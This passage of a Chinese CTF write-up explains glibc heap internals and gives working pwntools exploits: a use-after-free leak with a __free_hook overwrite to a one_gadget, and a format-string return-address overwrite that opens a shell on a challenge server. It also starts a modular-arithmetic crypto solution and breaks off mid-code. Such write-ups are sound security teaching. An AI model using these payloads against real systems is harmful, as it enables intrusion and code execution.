+</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>/* Number of threads attached to this arena.  0 if the arena is on
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>     the free list.  Access to this field is serialized by
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>     free_list_lock in arena.c.  */</span>
+</span></span><span style=display:flex><span>  INTERNAL_SIZE_T attached_threads;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>/* Memory allocated from the system in this arena.  */</span>
+</span></span><span style=display:flex><span>  INTERNAL_SIZE_T system_mem;
+</span></span><span style=display:flex><span>  INTERNAL_SIZE_T max_system_mem;
+</span></span><span style=display:flex><span>};
+</span></span></code></pre></div><p>这里面的 <code>bins</code> 数组就保存了 <code>Unsorted Bin</code> 的头节点，由于 <code>Unsorted Bin</code> 用（循环）双向链表维护，那么链表中尾节点的 <code>fd</code> 就会指向头节点，也就是结构体的固定偏移处了（事实上 <code>bins[0]</code> 和 <code>bins[1]</code> 就是 <code>Unsorted Bin</code> 的头节点），本题我们只往 <code>Unsorted Bin</code> 中放一个 <code>bin</code>，所以第这个 <code>bin</code> 就是尾节点了。事实上还是有必要多啰嗦几句，<code>fd</code> 指向下一个节点，<code>bk</code> 指向前一个节点，如果 <code>Unsorted Bin</code> 链表中不止一个 <code>bin</code> 的话第一个 <code>bin</code> 的 <code>fd</code> 是不会像本题一样指向 <code>main_arena</code> 的，但是 <code>bk</code> 仍然可以 leak，在 64 位机下由于地址高2字节为 <code>\x00</code> 的原因往往难以 leak 出 <code>bk</code>，但是 32 位机下往往是可以的。也就是说一些情况下不一定需要 leak 链表尾，头也是可以的。</p><p>附一张调试图</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/02/3076927169.png></div><p>这样应该就很清楚了</p><h5 id=如何获得-main_arena-的偏移>如何获得 <code>main_arena</code> 的偏移</h5><p>固定偏移具体是多少可以很容易地通过调试得出，也可以自己算，而 <code>main_arena</code> 相对于基地址的偏移稍微麻烦一点。把题目提供的 libc 放到 IDA 里面，找到 <code>malloc_trim()</code> 函数</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/02/2603976079.png></div><p><code>dword_3EBC40</code> 就是 <code>main_arena</code> 了。当然这样说他是就是显得很不负责任，凭啥说他是呢？还是要看一下 <code>malloc.c</code> 中的源码</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#902000>int</span>
+</span></span><span style=display:flex><span><span style=color:#06287e>__malloc_trim</span> (size_t s)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>  <span style=color:#902000>int</span> result <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> (__malloc_initialized <span style=color:#666>&lt;</span> <span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>    ptmalloc_init ();
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  mstate ar_ptr <span style=color:#666>=</span> <span style=color:#666>&amp;</span>main_arena;<span style=color:#60a0b0;font-style:italic>//&lt;=here!
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  <span style=color:#007020;font-weight:700>do</span>
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>      __libc_lock_lock (ar_ptr<span style=color:#666>-&gt;</span>mutex);
+</span></span><span style=display:flex><span>      result <span style=color:#666>|=</span> mtrim (ar_ptr, s);
+</span></span><span style=display:flex><span>      __libc_lock_unlock (ar_ptr<span style=color:#666>-&gt;</span>mutex);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>      ar_ptr <span style=color:#666>=</span> ar_ptr<span style=color:#666>-&gt;</span>next;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>while</span> (ar_ptr <span style=color:#666>!=</span> <span style=color:#666>&amp;</span>main_arena);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>return</span> result;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>两个对照一下就明白了。按说 <code>main_arena</code> 在很多函数里面肯定都出现了，为什么独独找这个函数呢？我也不知道。大家都用这个找就这个吧。</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#!/usr/bin/env python</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># coding=utf-8</span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>pwn</span> <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#sh = process(&#34;./note&#34;)</span>
+</span></span><span style=display:flex><span>sh <span style=color:#666>=</span> remote(<span style=color:#4070a0>&#34;159.75.104.107&#34;</span>,<span style=color:#40a070>30369</span>)
+</span></span><span style=display:flex><span>libc <span style=color:#666>=</span> ELF(<span style=color:#4070a0>&#34;./libc-2.27.so&#34;</span>) 
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>take</span>(size):
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;exit</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#4070a0>&#39;1&#39;</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;write?</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#007020>str</span>(size))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>delete</span>(index):
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;exit</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#4070a0>&#39;2&#39;</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;delete?</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#007020>str</span>(index))
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>edit</span>(payload,index):
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;exit</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#4070a0>&#39;3&#39;</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;edit?</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#007020>str</span>(index))
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>send(payload)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>show</span>(index):
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;exit</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#4070a0>&#39;4&#39;</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;show?</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#007020>str</span>(index))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>take(<span style=color:#40a070>2048</span>)<span style=color:#60a0b0;font-style:italic>#index:0</span>
+</span></span><span style=display:flex><span>take(<span style=color:#40a070>0x100</span>)<span style=color:#60a0b0;font-style:italic>#index:1</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>delete(<span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>show(<span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>libc_base <span style=color:#666>=</span> u64(sh<span style=color:#666>.</span>recv(<span style=color:#40a070>6</span>)<span style=color:#666>.</span>ljust(<span style=color:#40a070>8</span>,<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>)) <span style=color:#666>-</span> <span style=color:#40a070>0x3ebc40</span> <span style=color:#666>-</span> <span style=color:#40a070>96</span>
+</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;libc_base:&#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(libc_base))
+</span></span><span style=display:flex><span>delete(<span style=color:#40a070>1</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#malloc_hook = libc_base + libc.symbols[&#34;__malloc_hook&#34;]</span>
+</span></span><span style=display:flex><span>free_hook <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>symbols[<span style=color:#4070a0>&#34;__free_hook&#34;</span>]
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#log.success(&#34;malloc_hook:&#34; + hex(malloc_hook)) </span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#edit(p64(malloc_hook - 0x10),1)</span>
+</span></span><span style=display:flex><span>edit(p64(free_hook),<span style=color:#40a070>1</span>)
+</span></span><span style=display:flex><span>take(<span style=color:#40a070>0x100</span>)<span style=color:#60a0b0;font-style:italic>#index:2</span>
+</span></span><span style=display:flex><span>take(<span style=color:#40a070>0x100</span>)<span style=color:#60a0b0;font-style:italic>#index:3</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>one_gadget <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0x4f432</span>
+</span></span><span style=display:flex><span>realloc <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>symbols[<span style=color:#4070a0>&#34;__libc_realloc&#34;</span>]
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#payload = p64(one_gadget) + p64(realloc + 0xa)</span>
+</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> p64(one_gadget)
+</span></span><span style=display:flex><span>edit(payload,<span style=color:#40a070>3</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#take(0x200)</span>
+</span></span><span style=display:flex><span>delete(<span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>interactive()
+</span></span></code></pre></div><p>写 <code>malloc_hook</code> 的时候发现 <code>one_gadget</code> 都不能用，就改成 <code>free_hook</code> 了。</p><h3 id=killerqueen>killerqueen</h3><p>逻辑挺简单的，有两次格式化字符串攻击的机会，我选择第一次 leak，第二次改返回地址为 <code>one_gadget</code> getshell。其实刚开始的时候我是考虑通过格式占位符 <code>%200000c</code> 让 <code>printf</code> 输出大量字符，这样他就会调用 <code>malloc()</code>，那么就只有修改 <code>__malloc_hook</code> 或 <code>__free_hook</code> 为 <code>one_gadget</code> 就可以 <code>getshell</code> 了。但是由于 <code>one_gadget</code> 的限制不可行，就只好改返回地址了。</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#!/usr/bin/env python</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># coding=utf-8</span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>pwn</span> <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>LibcSearcher</span> <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#context(log_level = &#39;debug&#39;,os = &#39;linux&#39;,arch = &#39;amd64&#39;)</span>
+</span></span><span style=display:flex><span>context<span style=color:#666>.</span>terminal <span style=color:#666>=</span> [<span style=color:#4070a0>&#39;tmux&#39;</span>,<span style=color:#4070a0>&#39;splitw&#39;</span>,<span style=color:#4070a0>&#39;-h&#39;</span>]
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#40a070>0x70</span>,<span style=color:#40a070>0x79</span>):<span style=color:#60a0b0;font-style:italic>#0x10a41c -&gt; i==0x70;0x4f432 -&gt; i==0x48</span>
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>try</span>:
+</span></span><span style=display:flex><span>        <span style=color:#60a0b0;font-style:italic>#sh = process(&#39;./kq&#39;)</span>
+</span></span><span style=display:flex><span>        sh <span style=color:#666>=</span> remote(<span style=color:#4070a0>&#34;159.75.104.107&#34;</span>,<span style=color:#40a070>30339</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;电话</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#4070a0>&#39;0&#39;</span>)
+</span></span><span style=display:flex><span>        rand <span style=color:#666>=</span> <span style=color:#007020>int</span>(sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;:&#34;</span>,drop <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>True</span>),base <span style=color:#666>=</span> <span style=color:#40a070>10</span>)
+</span></span><span style=display:flex><span>        sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;什么</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#4070a0>&#39;a&#39;</span>)
+</span></span><span style=display:flex><span>        sh<span style=color:#666>.</span>send(<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#007020>str</span>(<span style=color:#666>-</span>rand <span style=color:#666>-</span> <span style=color:#40a070>2</span>))
+</span></span><span style=display:flex><span>        payload <span style=color:#666>=</span> <span style=color:#4070a0>&#39;%19$p-%17$p-%24$p-%44$p&#39;</span>
+</span></span><span style=display:flex><span>        sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;是——</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,payload)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#39;...</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>        _IO_2_1_stdout_addr <span style=color:#666>=</span> <span style=color:#007020>int</span>(sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;-&#34;</span>,drop <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>True</span>),base <span style=color:#666>=</span> <span style=color:#40a070>16</span>)
+</span></span><span style=display:flex><span>        _IO_file_write_addr <span style=color:#666>=</span> <span style=color:#007020>int</span>(sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;-&#34;</span>,drop <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>True</span>),base <span style=color:#666>=</span> <span style=color:#40a070>16</span>) <span style=color:#666>-</span> <span style=color:#40a070>45</span>
+</span></span><span style=display:flex><span>        prog_base <span style=color:#666>=</span> <span style=color:#007020>int</span>(sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;-&#34;</span>,drop <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>True</span>),base <span style=color:#666>=</span> <span style=color:#40a070>16</span>) <span style=color:#666>-</span> <span style=color:#40a070>0x10b8</span>
+</span></span><span style=display:flex><span>        stack_addr <span style=color:#666>=</span> <span style=color:#007020>int</span>(sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,drop <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>True</span>),base <span style=color:#666>=</span> <span style=color:#40a070>16</span>)
+</span></span><span style=display:flex><span>        ret_addr <span style=color:#666>=</span> stack_addr <span style=color:#666>-</span> <span style=color:#40a070>0x28</span> <span style=color:#666>-</span> <span style=color:#40a070>0xE0</span> 
+</span></span><span style=display:flex><span>        log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#39;_IO_2_1_stdout_:&#39;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(_IO_2_1_stdout_addr))
+</span></span><span style=display:flex><span>        log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#39;ret_addr:&#39;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(ret_addr))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        libc <span style=color:#666>=</span> LibcSearcher(<span style=color:#4070a0>&#34;_IO_2_1_stdout_&#34;</span>,_IO_2_1_stdout_addr)
+</span></span><span style=display:flex><span>        libc<span style=color:#666>.</span>add_condition(<span style=color:#4070a0>&#34;_IO_file_write&#34;</span>,_IO_file_write_addr)
+</span></span><span style=display:flex><span>        libc_base <span style=color:#666>=</span> _IO_2_1_stdout_addr <span style=color:#666>-</span> libc<span style=color:#666>.</span>dump(<span style=color:#4070a0>&#34;_IO_2_1_stdout_&#34;</span>)
+</span></span><span style=display:flex><span>        log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#39;libc_base:&#39;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(libc_base))
+</span></span><span style=display:flex><span>        log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#39;_IO_file_write_addr:&#39;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(_IO_file_write_addr))
+</span></span><span style=display:flex><span>        log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#39;_IO_file_write_addr_calc:&#39;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>dump(<span style=color:#4070a0>&#39;_IO_file_write&#39;</span>)))
+</span></span><span style=display:flex><span>        malloc_hook <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>dump(<span style=color:#4070a0>&#34;__malloc_hook&#34;</span>)
+</span></span><span style=display:flex><span>        one_gadget <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0x10a41c</span>
+</span></span><span style=display:flex><span>        <span style=color:#60a0b0;font-style:italic>#one_gadget = prog_base + 0x910</span>
+</span></span><span style=display:flex><span>        log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#39;one:&#39;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(one_gadget))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#60a0b0;font-style:italic>#payload = fmtstr_payload(6,{malloc_hook:one_gadget},numbwritten = 0,write_size = &#39;short&#39;)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        target_info <span style=color:#666>=</span> [[one_gadget <span style=color:#666>&amp;</span> <span style=color:#40a070>0xFFFF</span>,<span style=color:#40a070>0</span>],[(one_gadget <span style=color:#666>&gt;&gt;</span> <span style=color:#40a070>16</span>) <span style=color:#666>&amp;</span> <span style=color:#40a070>0xFFFF</span>,<span style=color:#40a070>2</span>],[(one_gadget <span style=color:#666>&gt;&gt;</span> <span style=color:#40a070>32</span>) <span style=color:#666>&amp;</span> <span style=color:#40a070>0xFFFF</span>,<span style=color:#40a070>4</span>]]
+</span></span><span style=display:flex><span>        target_info <span style=color:#666>=</span> <span style=color:#007020>sorted</span>(target_info,key <span style=color:#666>=</span> (<span style=color:#007020;font-weight:700>lambda</span> x:x[<span style=color:#40a070>0</span>]))
+</span></span><span style=display:flex><span>        <span style=color:#007020>print</span> target_info
+</span></span><span style=display:flex><span>        payload <span style=color:#666>=</span> <span style=color:#4070a0>&#39;%15$lln&#39;</span> 
+</span></span><span style=display:flex><span>        payload <span style=color:#666>+=</span> <span style=color:#4070a0>&#39;%&#39;</span> <span style=color:#666>+</span> <span style=color:#007020>str</span>(target_info[<span style=color:#40a070>0</span>][<span style=color:#40a070>0</span>]) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;c&#39;</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;%12$hn&#39;</span>
+</span></span><span style=display:flex><span>        payload <span style=color:#666>+=</span> <span style=color:#4070a0>&#39;%&#39;</span> <span style=color:#666>+</span> <span style=color:#007020>str</span>(target_info[<span style=color:#40a070>1</span>][<span style=color:#40a070>0</span>] <span style=color:#666>-</span> target_info[<span style=color:#40a070>0</span>][<span style=color:#40a070>0</span>]) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;c&#39;</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;%13$hn&#39;</span>
+</span></span><span style=display:flex><span>        payload <span style=color:#666>+=</span> <span style=color:#4070a0>&#39;%&#39;</span> <span style=color:#666>+</span> <span style=color:#007020>str</span>(target_info[<span style=color:#40a070>2</span>][<span style=color:#40a070>0</span>] <span style=color:#666>-</span> target_info[<span style=color:#40a070>1</span>][<span style=color:#40a070>0</span>]) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;c&#39;</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;%14$hn&#39;</span>
+</span></span><span style=display:flex><span>        payload <span style=color:#666>=</span> payload<span style=color:#666>.</span>ljust(<span style=color:#40a070>48</span>,<span style=color:#4070a0>&#39;a&#39;</span>)
+</span></span><span style=display:flex><span>        payload <span style=color:#666>+=</span> p64(ret_addr <span style=color:#666>+</span> target_info[<span style=color:#40a070>0</span>][<span style=color:#40a070>1</span>])
+</span></span><span style=display:flex><span>        payload <span style=color:#666>+=</span> p64(ret_addr <span style=color:#666>+</span> target_info[<span style=color:#40a070>1</span>][<span style=color:#40a070>1</span>])
+</span></span><span style=display:flex><span>        payload <span style=color:#666>+=</span> p64(ret_addr <span style=color:#666>+</span> target_info[<span style=color:#40a070>2</span>][<span style=color:#40a070>1</span>])
+</span></span><span style=display:flex><span>        payload <span style=color:#666>+=</span> p64(ret_addr <span style=color:#666>+</span> i)
+</span></span><span style=display:flex><span>        payload <span style=color:#666>=</span> payload<span style=color:#666>.</span>ljust(<span style=color:#40a070>0x100</span>,<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#007020>print</span> payload
+</span></span><span style=display:flex><span>        <span style=color:#60a0b0;font-style:italic>#payload += &#39;%150000cok&#39;</span>
+</span></span><span style=display:flex><span>        sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;什么</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,payload)
+</span></span><span style=display:flex><span>        sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;a&#34;</span>)
+</span></span><span style=display:flex><span>        log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#39;one:&#39;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(one_gadget))
+</span></span><span style=display:flex><span>        <span style=color:#60a0b0;font-style:italic>#gdb.attach(proc.pidof(sh)[0])</span>
+</span></span><span style=display:flex><span>        sh<span style=color:#666>.</span>sendline(<span style=color:#4070a0>&#34;&#34;</span>)
+</span></span><span style=display:flex><span>        sh<span style=color:#666>.</span>sendline(<span style=color:#4070a0>&#34;echo &#39;pwned&#39;&#34;</span>)
+</span></span><span style=display:flex><span>        sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;pwned&#34;</span>)
+</span></span><span style=display:flex><span>        sh<span style=color:#666>.</span>interactive()
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>break</span>
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>except</span>:
+</span></span><span style=display:flex><span>        sh<span style=color:#666>.</span>close()
+</span></span></code></pre></div><p>麻烦还是有点麻烦的，调了不少时间。</p><h2 id=crypto>Crypto</h2><h3 id=signin>signin</h3><p>扩欧扩欧扩欧，头疼死了</p><p><code>c</code> 的生成方式为<code>c = a ** p * m % p</code>，那么就是</p><p>$$
+c = (a^p *m) \mod p</p><p>$$</p><p>稍微化简一下就是</p><p>$$
+a*flag \equiv c \pmod p</p><p>$$</p><p>这个用扩欧就可以解掉了</p><p><code>python</code> 随便抄一手</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#007020;font-weight:700>import</span> <span style=color:#0e84b5;font-weight:700>libnum</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>a <span style=color:#666>=</span> <span style=color:#40a070>91800102844500997636793818421226295694813409817830489986833264638564136146943461411103817292401828996969369233967170793637678650849601387696384435842781413361986937383468183147837368716916336923130401758692466637339900841685124190941738003871183340798882867448829494255476406285790471594507528969176256426783</span>
+</span></span><span style=display:flex><span>p <span style=color:#666>=</span> <span style=color:#40a070>140208111156456080600354739062343045536089117061048107161300830037553007780214441135312269792888390170833068116015297988457063303634427372811831533471300403210269143894289963232120754105029762436830871759622002703367278520094311613669797030109244450375247896616467172698874479881280112375643366820088374319151</span>
+</span></span><span style=display:flex><span>c <span style=color:#666>=</span> <span style=color:#40a070>62669984905093476761116364147896749261246394704533378920607682538236231297338606898577411604795029080149360734264123808823106673707234674405503927459966218608821552490093818187535294751043077224591345844102800422939078248578001422406911409828355694332378238370530048125215690309230305439084596199405057273963</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>fastExpMod</span>(b, e, m):
+</span></span><span style=display:flex><span>    result <span style=color:#666>=</span> <span style=color:#40a070>1</span>
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>while</span> e <span style=color:#666>!=</span> <span style=color:#40a070>0</span>:
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (e<span style=color:#666>&amp;</span><span style=color:#40a070>1</span>) <span style=color:#666>==</span> <span style=color:#40a070>1</span>:
+</span></span><span style=display:flex><span>            <span style=color:#60a0b0;font-style:italic># ei = 1, then mul</span>
+</span></span><span style=display:flex><span>            result <span style=color:#666>=</span> (result <span style=color:#666>*</span> b) <span style=color:#666>%</span> m
+</span></span><span style=display:flex><span>        e <span style=color:#666>&gt;&gt;=</span> <span style=color:#40a070>1</span>
+</span></span><span style=display:flex><span>        <span style=color:#60a0b0;font-style:italic># b, b^2, b^4, b^8, ... , b^(2^n)</span>
+</span></span><span style=display:flex><span>        b <span style=color:#666>=</span> (b<span style=color:#666>*</span>b) <span style=color:#666>%</span> m
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> result
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>gcd</span>(a,b):
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span>(b <span style=color:#666>==</span> <span style=color:#40a070>0</span>):
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>return</span> a
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>else</span>:
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>return</span> gcd(b,a <span style=color:#666>%</span> b)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>exgcdRecursion</span>(a,b):
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> b<span style=color:#666>==</span><span style=color:#40a070>0</span>:
+</span></span><span style=display:flex><span>        x <span style=color:#666>=</span> <span style=color:#40a070>1</span>
+</span></span><span style=display:flex><span>        y <span style=color:#666>=</span> <span style=color:#40a070>0</span>
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>return</span> (a,x,y)
+</span></span><span style=display:flex><span>    r,x,y <span style=color:#666>=</span> exgcdRecursion(b,a<span style=color:#666>%</span>b)
+</span></span><span style=display:flex><span>    t <span style=color:#666>=</span> x
+</span></span><span style=display:flex><span>    x <span style=color:#666>=</span> y
+</span></span><span style=display:flex><span>    y <span style=color:#666>=</span> t<span style=color:#666>-</span> a <span style=color:#666>//</span> b <span style=color:#666>*</span> y
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> (a,x,y)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>a <span style=color:#666>=</span> fastExpMod(a,p,p)
